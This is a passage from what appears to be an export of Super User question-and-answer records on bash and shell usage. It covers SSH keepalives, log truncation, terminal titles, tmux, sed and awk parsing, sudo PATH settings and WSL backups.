<p>See <a href=""https://askubuntu.com/q/59458/309110"">Error message when I run sudo: unable to resolve host</a>
for more information.</p></li>
<li>Relaunch the <code>bash.exe</code> for the changes to take effect.</li>
<li><p>If that doesn't fix it, try restarting the service:</p>

<pre><code>sc stop  lxssmanager
sc start lxssmanager
</code></pre></li>
</ol>

<p>If you want to learn more about the bash in WSL,
you can <a href=""https://msdn.microsoft.com/en-us/commandline/wsl/faq"" rel=""noreferrer"">read the FAQ by Microsoft</a>.</p>
"
"How to prevent SSH from disconnecting if it's been idle for a while","699676","<linux><bash><ssh>","79","<blockquote>
  <p>To make it clear: I am looking for a solution that I start once after logging in, and then I want to use that terminal, walk away, come back two hours later and continue working, without typing anything before walking away.</p>
</blockquote>

<p>The problem is that there is something (usually a firewall or load-balancer), which is dropping idle sessions.  If you configure session keepalives, the keepalives will prevent network devices from considering the session as idle.</p>

<p><strong>Linux / Unix / Cygwin OpenSSH fix</strong>:<br>
The simplest fix is to enable ssh client keepalives; this example will send an ssh keepalive every 60 seconds:</p>

<pre><code>ssh -o ""ServerAliveInterval 60"" &lt;SERVER_ADDRESS&gt;
</code></pre>

<p>If you want to enable this on all your sessions, put this in your <code>/etc/ssh/ssh_config</code> or <code>~/.ssh/config</code>:</p>

<pre><code>ServerAliveInterval 60
</code></pre>

<p>For more information, see the <a href=""http://linux.die.net/man/5/ssh_config"" rel=""noreferrer""><code>ssh_config</code> manpage</a></p>

<p><strong>Putty Fix</strong>:</p>

<p>Save this to your PuTTY ""Default Settings""...</p>

<ul>
<li>Click on Connection</li>
<li>Type 60 into ""Seconds between keepalives""</li>
</ul>

<p><a href=""https://i.stack.imgur.com/Tgrlr.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/Tgrlr.png"" alt=""putty_screenshot""></a></p>
"
"When to use Bash and when to use Perl/Python/Ruby?","414965","<linux><bash><script><perl><ruby>","79","<p>Given a problem that both can handle, you'll want to use the one you're most comfortable with. Ultimately, there are a lot of small details, and only experience can teach you to see them.</p>

<p>Bash is a general purpose scripting language just like Python, Ruby, Perl, but each has different strengths over the rest. Perl excells at text analysis, Python claims to be the most elegant of the bunch, Bash scripts are excellent at ""piping stuff around"", if you know what I mean, and Ruby... well, Ruby is a little special in a lot of ways.</p>

<p>However, the differences between them only really matter once you have a healthy amount of scripting experience under your belt. I suggest you pick one language and push it to it's limits before moving to the next. You can do a lot in a shell script, more than most people would admit. Any language is just as hard as you want to make it. After you've written a couple things in it, every language is ""easy"" to you.</p>

<p>Being familiar with the shell pays off quickly if you live in Linux, so maybe you want to start with that. If you find a task you that is impossible or impractical to solve in a shell script, use something else.</p>

<p>Also, bear in mind that learning shell scripting is very simple. The real power of it lies in other programs, like awk, sed, tr, et al.</p>
"
"Why would you `cat /dev/null > /var/log/messages`?","849413","<linux><bash>","78","<p>You typically <code>cat /dev/null &gt; [something]</code> when you want to wipe file contents while ensuring there is absolutely zero risk of interruption to the actual file state. The contents of the file will clearly be wiped by the <code>cat /dev/null</code> yet the file itself—as it exists and is known to the file system it resides on—will still be there with the same inode number, ownership and permissions.</p>

<p>In the case of a log file, it could be that the log file itself is marked “in use” by another process. So doing—for example—an <code>rm /var/log/messages &amp;&amp; touch /var/log/messages</code> would be disruptive to other processes and might cause running processes to choke. Meaning a process that somehow is locked to a specific inode number connected to the file <code>/var/log/messages</code> could suddenly panic and say, “Hey! What happened to <code>/var/log/messages</code>!” even if the file is still there. Not to mention potential issues with ownership and permissions being incorrectly recreated.</p>

<p>Because of this uncertainty in usage/state of a file the use of <code>cat /dev/null &gt; [something]</code> is preferred by system admins who want to clear out a log but do not want to <em>potentially</em> interfere with the operation of already existing processes.</p>

<p>Also, <a href=""http://tldp.org/LDP/abs/html/sha-bang.html"">in the context of the page you link to</a> the author states the following:</p>

<blockquote>
  <p>There is nothing unusual here, only a set of commands that could just
  as easily have been invoked one by one from the command-line on the
  console or in a terminal window. The advantages of placing the
  commands in a script go far beyond not having to retype them time and
  again.</p>
</blockquote>

<p>So the “nothing unusual” the author mentions is with regards to the whole concept of what that specific bash script is: It’s just a set of simple commands that can just as easily be run from the command line but are placed in a text file to avoid having to retype them over and over again.</p>
"
"How to rehash executables in $PATH with bash","490983","<bash>","78","<p><code>hash -r</code> is what needs to be done. In zsh it is rehash and rehash doesn't exist (by default) in bash.</p>
"
"How can Homebrew print a beer mug in Terminal?","538061","<macos><bash><terminal.app><homebrew>","77","<p>Homebrew is open source, so you can read its code to find out how it shows the icon. The line they're using is in <a href=""https://github.com/mxcl/homebrew/blob/master/Library/Homebrew/formula_installer.rb#L266"" rel=""noreferrer"">the file <code>formula_installer.rb</code></a>:</p>

<pre><code>print ""🍺  "" if MacOS.version &gt;= :lion
</code></pre>

<p>The first character in the <code>print</code> command is a ""<code>🍺</code>"", or <a href=""http://www.fileformat.info/info/unicode/char/1f37a/index.htm"" rel=""noreferrer"">unicode #1f37a 'BEER MUG'</a>.</p>

<p><img src=""https://i.stack.imgur.com/ff3kp.png"" alt=""""></p>

<p>So it's not an icon but an funny unicode beer mug :)</p>
"
"How do I enter a literal tab character in a bash shell?","362235","<bash><bash-scripting>","77","<p>Don't use double quotes.</p>

<p><code>sort -t $'\t'</code></p>

<p>Or I think Ctrl V inserts a Tab??</p>

<p>Edit:</p>

<p><a href=""http://www.gnu.org/s/bash/manual/html_node/ANSI_002dC-Quoting.html#ANSI_002dC-Quoting"">http://www.gnu.org/s/bash/manual/html_node/ANSI_002dC-Quoting.html#ANSI_002dC-Quoting</a></p>
"
"cURL: how to suppress strange output when redirecting?","173209","<bash><redirection><curl><pipe><stderr>","76","<p>Try this:</p>

<pre><code>curl -vs -o /dev/null http://somehost/somepage 2&gt;&amp;1
</code></pre>

<p>That will suppress the progress meter, send <code>stdout</code> to <code>/dev/null</code> and redirect <code>stderr</code> (the <code>-v</code> output) to <code>stdout</code>.</p>
"
"How do I get ls --color=auto to work on Mac OS X?","183876","<linux><macos><bash><ls>","75","<p><code>ls</code> is actually separate from Bash. Mac OS X has a BSD version of <code>ls</code>, which requires <code>-G</code> on the command line, or <code>CLICOLOR</code> (and perhaps <code>LSCOLORS</code>) in the environment.</p>

<p>See <code>man ls</code> for more info.</p>
"
"push/pop current directory?","231881","<linux><bash>","75","<p>There is <code>pushd</code> and <code>popd</code></p>

<blockquote>
  <p>Bash will keep a history of the directories you visit, you just have to ask.
  Bash stores the history in a stack and uses the commands pushd
  and popd to manage the stack.</p>
</blockquote>

<p><a href=""http://www.softpanorama.org/Scripting/Shellorama/pushd_and_popd.shtml"" rel=""noreferrer"">More to read</a></p>

<p>Example:</p>

<pre><code>$ pwd; pushd /tmp; pwd; popd; pwd
/home/me
/tmp ~
/tmp
~
/home/me
</code></pre>
"
"Rename user's group name","404135","<linux><ubuntu><bash><user-accounts>","75","<p><code>groupmod</code> should work fine:</p>

<pre><code>$ groupmod --help
Usage: groupmod [options] GROUP

Options:
  -g, --gid GID                 change the group ID to GID
  -h, --help                    display this help message and exit
  -n, --new-name NEW_GROUP      change the name to NEW_GROUP
  -o, --non-unique              allow to use a duplicate (non-unique) GID
  -p, --password PASSWORD       change the password to this (encrypted)
                                PASSWORD
</code></pre>

<p>Use it like this:</p>

<pre><code>groupmod --new-name NEW_GROUP_NAME OLD_GROUP_NAME
</code></pre>
"
"How to join/merge many mp3 files?","314239","<linux><bash>","74","<p>This will concatenate two mp3 files, and the resulting metadata will be that of the first file:</p>

<pre><code>ffmpeg -i ""concat:file1.mp3|file2.mp3"" -acodec copy output.mp3
</code></pre>

<p>This is because, for ffmpeg, the whole ""concat:"" part is a single ""input file"", and its metadata will be of the first concatenated file. If you want to use metadata from the second file instead, you have to add it as a dummy input file and map its metadata to that of the output:</p>

<pre><code>ffmpeg -i ""concat:file1.mp3|file2.mp3"" -i file2.mp3 -acodec copy test.mp3 -map_metadata 0:1
</code></pre>

<p>If you want to construct your metadata from the two metadatas, you'll have to do it by hand. You can dump a file's metadata with</p>

<pre><code>ffmpeg -i file1.mp3 -f ffmetadata file1.metadata
</code></pre>

<p>After dumping both metadatas and constructing new metadata, you can add it to the output file with <code>-metadata</code>, and you can disable metadata copying by setting a <code>-map_metadata</code> mapping from a negative input file number. This sets a name value and no other metadata:</p>

<pre><code>ffmpeg -i ""concat:file1.mp3|file2.mp3"" -acodec copy -metadata ""title=Some Song"" test.mp3 -map_metadata 0:-1
</code></pre>
"
"Find out if user name exists","336275","<bash><unix><shell>","74","<p>One of the most basic tools to be used for that is probably <code>id</code>.</p>

<pre><code>#!/bin/bash
if id ""$1"" &gt;/dev/null 2&gt;&amp;1; then
        echo ""user exists""
else
        echo ""user does not exist""
fi
</code></pre>

<p>Which produces</p>

<pre><code>$ ./userexists root
user exists
$ ./userexists alice
user does not exist
$ ./userexists
user does not exist
</code></pre>
"
"How to create and format a partition using a bash script?","332252","<bash><partitioning><ntfs><fdisk>","73","<p>Similar to the previous suggestions, piping commands to fidsk,  I've found this approach useful to leave details for subsequent maintainers. The sed bits strip off all the comments before fdisk gets the input.</p>

<pre><code># to create the partitions programatically (rather than manually)
# we're going to simulate the manual input to fdisk
# The sed script strips off all the comments so that we can 
# document what we're doing in-line with the actual commands
# Note that a blank line (commented as ""defualt"" will send a empty
# line terminated with a newline to take the fdisk default.
sed -e 's/\s*\([\+0-9a-zA-Z]*\).*/\1/' &lt;&lt; EOF | fdisk ${TGTDEV}
  o # clear the in memory partition table
  n # new partition
  p # primary partition
  1 # partition number 1
    # default - start at beginning of disk 
  +100M # 100 MB boot parttion
  n # new partition
  p # primary partition
  2 # partion number 2
    # default, start immediately after preceding partition
    # default, extend partition to end of disk
  a # make a partition bootable
  1 # bootable partition is partition 1 -- /dev/sda1
  p # print the in-memory partition table
  w # write the partition table
  q # and we're done
EOF
</code></pre>
"
"Set the title of the terminal window to the current directory","79972","<macos><bash><terminal><terminal.app>","72","<p>Depends on your shell.</p>

<p>This <a href=""http://www.ibiblio.org/pub/Linux/docs/HOWTO/other-formats/html/Xterm-Title.html.gz"" rel=""noreferrer"">article</a> displays multiple methods.</p>

<p>I personally use zsh which has a convenient precmd() function which is run before each prompt.</p>

<pre><code>    precmd () { print -Pn ""\e]2;%n@%M | %~\a"" } # title bar prompt
</code></pre>

<p>Although the other questions list bash methods, they alias cd.  Bash provides an inherent method that chains off just the prompt.</p>

<blockquote>
  <p>bash</p>
  
  <p>bash supplies a variable PROMPT_COMMAND which contains a command to execute before the prompt. This example (inserted in ~/.bashrc) sets the title to ""username@hostname: directory"":</p>
</blockquote>

<pre><code> PROMPT_COMMAND='echo -ne ""\033]0;${USER}@${HOSTNAME}: ${PWD}\007""'
</code></pre>

<blockquote>
  <p>where \033 is the character code for ESC, and \007 for BEL. Note that the quoting is important here: variables are expanded in ""..."", and not expanded in '...'. So PROMPT_COMMAND is set to an unexpanded value, but the variables inside ""..."" are expanded when PROMPT_COMMAND is used.</p>
  
  <p>However, PWD produces the full directory path. If we want to use the '~' shorthand we need to embed the escape string in the prompt, which allows us to take advantage of the following prompt expansions provided by the shell:</p>
</blockquote>

<pre><code>\u          expands to $USERNAME
\h          expands to hostname up to first '.'
\w          expands to directory, replacing $HOME with '~'
\[...\]     embeds a sequence of non-printing characters
</code></pre>

<blockquote>
  <p>Thus, the following produces a prompt of ""bash$ "", and an xterm title of ""username@hostname: directory"" ...</p>
</blockquote>

<pre><code> case $TERM in
     xterm*)
        PS1=""\[\033]0;\u@\h: \w\007\]bash\$ ""
        ;;
     *)
        PS1=""bash\$ ""
        ;;
 esac
</code></pre>

<blockquote>
  <p>Note the use of [...], which tells bash to ignore the non-printing control characters when calculating the width of the prompt. Otherwise line editing commands get confused while placing the cursor. </p>
</blockquote>
"
".bashrc not sourced in iTerm + Mac OS X","320065","<mac><bash>","72","<p>Bash will source EITHER .bash_profile or .bashrc, depending upon how it is called. If it is a login shell, Bash looks for ~/.bash_profile, ~/.bash_login, or ~/.profile, in that order, and sources the first one it finds (and only that one). If it is not a login shell but is interactive (like most terminal sessions), Bash will source ~/.bashrc.</p>

<p>Likely, iTerm is looking for ~/.bashrc. If it's configured to start as a login shell, it will look for ~/.bash_profile. It's almost certainly an error within the config file rather than that the shell is not sourcing it.</p>

<p>I would put a line at the beginning of each file. At the top of ~/.bash_profile:</p>

<pre><code>export BASH_CONF=""bash_profile""
</code></pre>

<p>And at the top of ~/.bashrc:</p>

<pre><code>export BASH_CONF=""bashrc""
</code></pre>

<p>Then, open a new iTerm and type</p>

<pre><code>$ echo $BASH_CONF
</code></pre>

<p>That should confirm the file is being sourced and you can look into the syntax of the file.</p>
"
"How do I perform commands in another folder, without repeating the folder path?","596712","<linux><command-line><bash><shell><script>","72","<p>Simply use <a href=""http://www.gnu.org/software/bash/manual/html_node/Brace-Expansion.html"" rel=""nofollow noreferrer"">brace expansion</a>:</p>

<pre><code>mv /folder1/folder2/folder3/{file.txt,file-2013.txt}
</code></pre>

<p>This is equivalent to writing:</p>

<pre><code>mv /folder1/folder2/folder3/file.txt /folder1/folder2/folder3/file-2013.txt
</code></pre>

<p>Brace expansion lets you supply more arguments, of course. You can even pass ranges to it, e.g. to create a couple of test folders, you can run <code>mkdir test_{a..z}</code>, and starting with Bash 4, you can create zero-padded sequences as well, as in <code>touch foo{0001..3}</code>, which creates <code>foo0001</code>, <code>foo0002</code> and <code>foo0003</code>. The <a href=""http://wiki.bash-hackers.org/syntax/expansion/brace"" rel=""nofollow noreferrer"">Bash Hackers Wiki</a> has an article with a couple of examples for you.</p>

<p>If you have to use two different commands, use a subshell and <code>cd</code> there first, <a href=""https://superuser.com/questions/596712/how-do-perform-commands-in-another-folder-without-repeating-the-folder-path#answer-596716"">as in @Ignacio's answer</a>.</p>
"
"Bash if on single line","1169664","<linux><command-line><bash><bashrc>","71","<p>You would write it as such:</p>

<pre><code>if [ -f ""/usr/bin/wine"" ]; then export WINEARCH=win32; fi
</code></pre>

<p>Note that this could also be written (as suggested by @glennjackman):</p>

<pre><code>[ -f ""/usr/bin/wine"" ] &amp;&amp; export WINEARCH=win32
</code></pre>
"
"bash watch command with colors preserved","125469","<linux><bash><watch>","71","<p>The right command is</p>

<pre><code>watch --color ""ls -a1 --color""
</code></pre>

<p>It isn't documented in the man page or the --help screen. I has to use strings to find it.</p>
"
"Continuously re-execute a command when it finishes in Bash","361902","<linux><bash>","70","<p>This creates an infinite loop, executing <code>command</code> over and over again.</p>
<pre class=""lang-bsh prettyprint-override""><code>while :
do
    command
done
</code></pre>
"
"How to list printer names acceptable for use with lpr?","177445","<linux><ubuntu><bash><printing><lpr>","70","<pre><code>$ lpstat -p -d
</code></pre>

<p>From the <a href=""https://www.cups.org/doc/options.html#PRINTER"" rel=""noreferrer"">CUPS manual</a>.</p>
"
"Messed up my .bash_profile remotely, can't ssh back in","1504530","<linux><bash><ssh><remote-access>","70","<p>As described <a href=""https://askubuntu.com/questions/63741/can-i-ssh-into-my-account-without-invoking-profile#63766"">here</a> you can use</p>

<pre><code>ssh -t user@host bash --noprofile
</code></pre>

<p>in fact, as @JoL suggests, you don't even need the <code>--noprofile</code>, since when ssh executes bash as just another command, it's not considered a login shell. Running <code>ssh -t user@host bash</code> will only read the RC files; and running <code>ssh -t user@host bash --norc</code> will not read even those.</p>
"
"Run or send a command to a tmux pane in a running tmux session","492266","<bash><shell><tmux>","68","<p>Each <em>tmux</em> pane is an interface for a single pty (pseudo tty). Non-split windows have a single pane; split windows have multiple panes.</p>

<p><em>tmux</em> does not supply a way to add extra processes to a pane once it has been started with its initial command. It is up to that initial command’s process (usually a shell) to supply job control<sup>1</sup> for that terminal.</p>

<p>If you want to clobber whatever is currently running in the pane, you can use <code>respawn-pane -k</code> to kill the existing command and replace it with a new one (e.g., <code>respawn-pane -t sessionname:0.4 -k 'some -new command'</code>).</p>

<p>But, if you want to maintain whatever is currently running in the pane, then there may be no better option that simply “typing at it” with <code>send-keys</code>.</p>

<p>You might script it like this (attach last, because otherwise the script will just wait for you to detach before continuing):</p>

<pre><code>session=whatever
window=${session}:0
pane=${window}.4
tmux send-keys -t ""$pane"" C-z 'some -new command' Enter
tmux select-pane -t ""$pane""
tmux select-window -t ""$window""
tmux attach-session -t ""$session""
</code></pre>

<p>Note that, on the <code>send-keys</code> command, you should actually type the letters
<kbd>E</kbd> <kbd>n</kbd> <kbd>t</kbd> <kbd>e</kbd> <kbd>r</kbd>,
to tell <code>tmux</code> to send a newline key to the window. 
(Naturally, every command ends with the <kbd>Enter</kbd> key.)</p>

<hr>

<p><sup>1</sup>Job control is the arbitration between multiple process groups of a single session that uses the tty as its controlling terminal. I.e., the <kbd>Ctrl</kbd>+<kbd>Z</kbd> suspend key, and the <code>jobs</code>, <code>fg</code>, and <code>bg</code> shell commands.</p>
"
"Difference between ""a=b"" and ""export a=b"" in bash","18988","<bash><shell><process><environment-variables>","67","<p><code>export</code> propagates the variable to subprocesses.</p>

<p>For example, if you did </p>

<pre><code>FOO=bar
</code></pre>

<p>then a subprocess that checked for FOO wouldn't find the variable whereas</p>

<pre><code>export FOO=bar
</code></pre>

<p>would allow the subprocess to find it.</p>

<p>But if <code>FOO</code> has <em>already</em> been defined as an environment variable, then <code>FOO=bar</code> will modify the value of that environment variable.</p>

<p>For example:</p>

<pre><code>FOO=one     # Not an environment variable
export FOO  # Now FOO is an environment variable
FOO=two     # Update the environment variable, so sub processes will see $FOO = ""two""
</code></pre>

<p>Older shells didn't support the <code>export FOO=bar</code> syntax; you had to write <code>FOO=bar; export FOO</code>.</p>
"
"Why is . not in the path by default?","156582","<bash><path>","67","<p>You answered correctly your own question, that's exactly why dot isn't in the path:<br>
To protect against childish viruses or honest mistakes.</p>

<p>Of course, this is a very lame and useless anti-virus measure, and nothing stops you from adding dot to the path yourself.</p>
"
"How to write a script that accepts input from a file or from stdin?","747884","<command-line><bash><stdin>","67","<p>If the file argument is the first argument to your script, test that there is an argument (<code>$1</code>) and that it is a file. Else read input from stdin -</p>

<p>So your script could contain something like this:</p>

<pre class=""lang-none prettyprint-override""><code>#!/bin/bash
[ $# -ge 1 -a -f ""$1"" ] &amp;&amp; input=""$1"" || input=""-""
cat $input
</code></pre>

<p>e.g. then you can call the script like</p>

<pre><code>./myscript.sh filename
</code></pre>

<p>or </p>

<pre><code>who | ./myscript.sh
</code></pre>

<p><strong>Edit</strong>
Some explanation of the script:</p>

<p><code>[ $# -ge 1 -a -f ""$1"" ]</code> - If at least one command line argument (<code>$# -ge 1</code>) AND (-a operator) the first argument is a file (-f tests if ""$1"" is a file) then the test result is true.</p>

<p><code>&amp;&amp;</code> is the shell logical AND operator. If test is true, then assign <code>input=""$1""</code> and <code>cat $input</code> will output the file.</p>

<p><code>||</code> is the shell logical OR operator. If the test is false, then commands following <code>||</code> are parsed. input is assigned to ""-"". The command <code>cat -</code> reads from the keyboard.</p>

<p>Summarising, if the script argument is provided and it is a file, then variable input is assigned to the file name. If there is no valid argument then cat reads from the keyboard.</p>
"
"Monitoring a file until a string is found","270529","<bash><grep><tail><logfiles>","67","<h1>A simple POSIX one-liner</h1>

<p>Here is a simple one-liner. It doesn't need bash-specific or non-POSIX tricks, or even a named pipe. All you really need is to decouple the termination of <code>tail</code> from <code>grep</code>. That way, once <code>grep</code> ends, the script can continue even if <code>tail</code> hasn't ended yet. So this simple method will get you there:</p>

<pre><code>( tail -f -n0 logfile.log &amp; ) | grep -q ""Server Started""
</code></pre>

<p><code>grep</code> will block until it has found the string, whereupon it will exit. By making <code>tail</code> run from it's own sub-shell, we can place it in the background so it runs independently. Meanwhile, the main shell is free to continue execution of the script as soon as <code>grep</code> exits. <code>tail</code> will linger in its sub-shell until the next line has been written to the logfile, and then exit (possibly even after the main script has terminated). The main point is that the pipeline no longer waits for <code>tail</code> to terminate, so the pipeline exits as soon as <code>grep</code> exits.</p>

<p>Some minor tweaks:</p>

<ul>
<li>The option -n0 to <code>tail</code> makes it start reading from the current last line of logfile, in case the string exists earlier in the logfile.</li>
<li>You might want to give <code>tail</code> -F rather than -f. It is not POSIX, but it allows <code>tail</code> to work even if the log is rotated while waiting.</li>
<li>Option -q rather than -m1 makes <code>grep</code> quit after the first occurrence, but without printing out the trigger line. Also it is POSIX, which -m1 isn't.</li>
</ul>
"
"how do I add the 'tree' command to git-bash on Windows?","531592","<windows-7><bash><git><git-bash>","66","<p>You could also use <code>""cmd //c tree""</code> to use Windows' <code>tree</code></p>

<p>Explanation:</p>

<ul>
<li>Launch cmd with '/c' argument and run tree, then terminate</li>
</ul>

<blockquote>
  <p>/C      Carries out the command specified by string and then
  terminates</p>
</blockquote>

<p>(extra slash for escaping)</p>

<p>/a use to run with ascii chars in case it doesn't display right.</p>

<p>Answered in greater detail here: <a href=""https://stackoverflow.com/q/515309/1261166"">https://stackoverflow.com/q/515309/1261166</a></p>
"
"Monitor TCP Traffic on specific port","604998","<linux><bash>","64","<p><strong>edit</strong>: I'm still getting upvotes for this years later. Please don't go for this answer, the <a href=""https://superuser.com/a/848966/39201"">answer using <code>iptables</code></a> here is far superior in my opinion.</p>

<hr>

<pre><code>tcpdump port 443 and '(tcp-syn|tcp-ack)!=0'
</code></pre>

<p>or only <code>tcp-syn</code>, or only <code>tcp-ack</code> (my guess would be that one), depending on what you need.</p>
"
"How to use 'sed' with piping","1107680","<bash><grep><sed>","63","<p>If you are going to use  sed, there is no need to also use grep.  Try:</p>

<pre><code>npm info webpack | sed -En ""s/version: '(.*)',/\1/p""
</code></pre>

<p>Example:</p>

<pre><code>$ echo  ""version: '2.1.0-beta.12',"" | sed -En ""s/version: '(.*)',/\1/p""
2.1.0-beta.12
</code></pre>

<h3>Alternative: using awk</h3>

<p>Similarly, if we use awk, there is no need to also grep:</p>

<pre><code>npm info webpack | awk -F""[ ',]+"" '/version:/{print $2}'
</code></pre>

<p>Example:</p>

<pre><code>$ echo  ""version: '2.1.0-beta.12',"" | awk -F""[ ',]+"" '/version:/{print $2}'
2.1.0-beta.12
</code></pre>

<p><strong>How it works:</strong></p>

<ul>
<li><p><code>-F""[ ',]+""</code></p>

<p>This tells awk to use spaces, single quotes, or commas or any combination thereof as field separators.</p></li>
<li><p><code>/version:/{print $2}</code></p>

<p>If a line contains <code>version:</code>, then print the second field.</p></li>
</ul>
"
"The MD5 hash value is different from Bash and PHP","1043672","<linux><bash><security><php><md5sum>","61","<p>By default, <code>echo</code> includes a newline character at the end of the output. However, PHP and the online sites you used do not include the newline. To suppress the newline character, use the <code>-n</code> flag:</p>

<pre><code>echo -n ""hello"" | md5sum
</code></pre>

<p>Output:</p>

<pre>
5d41402abc4b2a76b9719d911017c592  -
</pre>

<p>See: <code>help echo</code></p>

<hr>

<p>or with printf:</p>

<pre><code>printf ""%s"" ""hello"" | md5sum
</code></pre>
"
"How do I unset or get rid of a bash function?","154332","<linux><command-line><bash><shell>","61","<p>The <em>unset</em> built-in command takes an option, <code>-f</code>, to delete functions:</p>

<pre><code>unset -f foo
</code></pre>

<p>Form the <em>unset</em> entry in the <em>bash</em> manpage:</p>

<blockquote>
  <p>If -f is specified, each name refers to a shell function, and the function definition is removed.</p>
</blockquote>

<p>Note: <code>-f</code> is only really necessary if a variable with the same name exists. If you do not also have a variable named <code>foo</code>, then <code>unset foo</code> will delete the function.</p>
"
"How can I use a Bash-like shell on Windows?","608106","<windows><bash><terminal><shell><bash-alias>","60","<p>You could install <a href=""http://en.wikipedia.org/wiki/Cygwin"" rel=""noreferrer"">Cygwin</a> or <a href=""http://en.wikipedia.org/wiki/MinGW"" rel=""noreferrer"">MSYS/MinGW</a>, or you could install a full Linux distribution in a virtual machine (for example, using <a href=""http://en.wikipedia.org/wiki/VirtualBox"" rel=""noreferrer"">VirtualBox</a>).</p>
"
"How do I convert a bash array variable to a string delimited with newlines?","461981","<bash><newlines>","60","<p>Here's a way that utilizes bash parameter expansion and its <code>IFS</code> special variable.</p>

<pre><code>$ System=('s1' 's2' 's3' 's4 4 4')
$ ( IFS=$'\n'; echo ""${System[*]}"" )
</code></pre>

<p>We use a subshell to avoid overwriting the value of <code>IFS</code> in the current environment. In that subshell, we then modify the value of <code>IFS</code> so that the first character is a newline (using <code>$'...'</code> quoting). Finally, we use parameter expansion to print the contents of the array as a single word; each element is separated by the first charater of <code>IFS</code>.</p>

<p>To capture to a variable:</p>

<pre><code>$ var=$( IFS=$'\n'; echo ""${System[*]}"" )
</code></pre>

<p>If your bash is new enough (4.2 or later), you can (and should) still use <code>printf</code> with the <code>-v</code> option:</p>

<pre><code>$ printf -v var ""%s\n"" ""${System[@]}""
</code></pre>

<p>In either case, you may not want the final newline in <code>var</code>. To remove it:</p>

<pre><code>$ var=${var%?}    # Remove the final character of var
</code></pre>
"
"In Linux, how do I truncate command-line output?","332356","<linux><command-line><bash>","59","<p>OMG, I totally forgot about <code>cut</code>!</p>

<pre><code>grep -nr sumthin * | cut -c -80
</code></pre>

<p>^ does the trick! >_&lt;</p>
"
"How to verify that file2 is newer than file1 in bash?","188240","<bash>","59","<p>Found it <a href=""http://www.unix.com/shell-programming-scripting/113734-if-condition-check-one-file-newer-than-other-first-file-name-uncertain.html""> here </a></p>

<pre><code>for f in /abcd/xyz* do
   [ ""$f"" -nt /abcd/test.txt ] &amp;&amp; echo ""file f$ found"" done
</code></pre>
"
"command not found when using sudo","709515","<linux><ubuntu><bash><sudo>","58","<p><code>$PATH</code> is evaluated by your shell, so your check doesn't work as you expect it to.</p>

<p><code>/etc/sudoers</code> is configured to replace your <code>PATH</code> with a default one.</p>

<p><code>sudo</code> does not load a login shell environment before executing the command, so the default <code>PATH</code> from <code>/etc/sudoers</code> is used. <code>su -</code> does open a login shell, which involves loading <code>/etc/profile</code>. See <code>man bash</code>, section <em>INVOCATION</em>.</p>

<p>Just remove the <code>PATH</code> reset in <code>/etc/sudoers</code>. It's likely a rule called <code>secure_path</code>.</p>

<hr>

<h3>CentOS</h3>

<p>In CentOS you can add <code>PATH</code> to the <code>Defaults env_keep</code> section:</p>

<pre><code>Defaults    env_keep = ""COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR \
                        LS_COLORS MAIL PS1 PS2 QTDIR USERNAME \
                        LANG LC_ADDRESS LC_CTYPE LC_COLLATE LC_IDENTIFICATION \
                        LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC \
                        LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS \
                        _XKB_CHARSET XAUTHORITY PATH""
</code></pre>
"
"How to backup (WSL) Linux Subsystem for Windows 10, before system reset or reinstall?","1164818","<bash><backup><reinstall><reset><windows-subsystem-for-linux>","58","<p><strong>Windows 10 v1903</strong> <a href=""https://devblogs.microsoft.com/commandline/whats-new-for-wsl-in-windows-10-version-1903/"" rel=""noreferrer"">includes a built-in WSL export/import command</a>.  Specifically, <code>wsl --export</code>, which produces a <code>tar</code> and <code>wsl --import</code>, which imports a previously exported <code>tar</code>. You can then move this file between computers.</p>

<p>You can also specify stdin/stdout with <code>-</code>, which should allow you to directly transfer to another machine and import using a remote shell like <code>ssh</code>.</p>
"
"How to use Cmd's tab autocomplete effectively?","584013","<windows><bash><command-line>","58","<p><strong>1 year update</strong>: I came to the conclusion that Cmd's autocomplete is unusable, and stopped using it.</p>

<p>I installed <a href=""http://mridgers.github.io/clink/"" rel=""noreferrer"">Clink</a> which gives you Bash-style autocompletion in Cmd.</p>

<blockquote>
  <p>Clink combines the native Windows shell cmd.exe with the powerful command line editing features of the GNU Readline library, which provides rich completion, history, and line-editing capabilities</p>
</blockquote>

<p>It's brilliant.</p>
"
"Bash command to focus a specific window","142945","<ubuntu><bash><gnome>","57","<p>The wmctrl command seems to do the job. It was already installed for me, but it's available in the repositories in case anyone needs it.</p>

<pre><code>wmctrl -l 
</code></pre>

<p>Lists currently open windows (including the gnome panels).</p>

<pre><code>wmctrl -a STRING
</code></pre>

<p>Gives focus to a window containing STRING in its title. I'm not sure what happens if more than one window meets that condition.<br>
In my case the command was:</p>

<pre><code>wmctrl -a Firefox
</code></pre>
"
"How to remove all files starting with a certain string in Linux","482435","<linux><bash>","57","<p>To delete all files which name has name, you can use it:</p>

<pre><code>find  . -name 'name*' -exec rm {} \;
</code></pre>
"
"How can I display the absolute path in bash prompt?","202212","<bash><path><prompt>","57","<p>Just replace <code>\w</code> with <code>\$PWD</code>:</p>

<pre><code>PS1=""\[\`if [[ \$? = ""0"" ]]; then echo '\e[32m\h\e[0m'; else echo '\e[31m\h\e[0m' ; fi\`:\$PWD\n\$ ""
</code></pre>

<p>Anyway if you mind a little tip, I'd write something like:</p>

<pre><code>PS1='\[`[ $? = 0 ] &amp;&amp; X=2 || X=1; tput setaf $X`\]\h\[`tput sgr0`\]:$PWD\n\$ '
</code></pre>
"
"Bash: is there a way to search for a particular string in a directory of files?","345101","<search><bash>","57","<p>With <code>grep</code>:</p>

<pre><code>grep -R ""toUppercase()"" *
</code></pre>

<p>Or, if you have <a href=""http://betterthangrep.com/"" rel=""noreferrer"">ack-grep</a> installed, simply:</p>

<pre><code>ack-grep ""toUppercase""
</code></pre>

<p>If you want to limit the search in C files, with <code>ack-grep</code>:</p>

<pre><code>ack-grep -cc ""toUppercase()""
</code></pre>

<p><code>ack-grep</code> can also be installed on OSX but the executable is called just <code>ack</code>.</p>
"
"What is the purpose of cd ` (backtick)?","1203270","<linux><bash>","56","<p>What you've typed is a <a href=""https://unix.stackexchange.com/a/27432"">backtick</a> - it is the start of an instruction to bash to evaluate what you type as a command. The <code>&gt;</code> is displayed to indicate you are still entering the command on the next line. </p>

<p>If you close the backtick you'll find the whole command will run. E.g.</p>

<pre><code>~$ cd `
&gt; echo /var`
/var$
</code></pre>
"
